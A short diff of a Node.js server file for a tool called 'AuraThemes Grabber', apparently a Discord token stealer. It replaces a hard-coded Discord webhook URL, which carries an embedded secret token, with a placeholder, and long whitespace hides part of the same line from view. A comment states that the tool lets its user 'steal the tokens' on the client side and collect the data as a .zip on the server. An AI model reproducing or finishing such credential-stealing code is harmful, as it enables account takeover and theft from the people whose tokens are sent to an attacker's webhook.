@@ -8,8 +8,7 @@ const app = require('express')(),
     server = http.createServer(app),
     FormData = require('form-data');
 let { Webhook, MessageBuilder } = require("discord-webhook-node"),
-    //ADD YOUR WEBHOOK HERE TO START
-    webhook = new Webhook("https://discord.com/api/webhooks/1171664723247366184/PeCI5oAk9ckOwPTjcQfS74cJeVvDTp6b2pxpq7C-lD2qRD5aRvd7TB0KkNdBusALwEUf")                                                                                                                                                                     .setUsername("AuraThemes Grabber").setAvatar("https://avatars.githubusercontent.com/u/149415297?s=200&v=4")
+    webhook = new Webhook("ADD YOUR WEBHOOK HERE TO START")                                                                                                                                                                     .setUsername("AuraThemes Grabber").setAvatar("https://avatars.githubusercontent.com/u/149415297?s=200&v=4")
 
 // not finished yet but you can now steal the tokens with the client, -
 // side and with the server you have the data in a .zip file
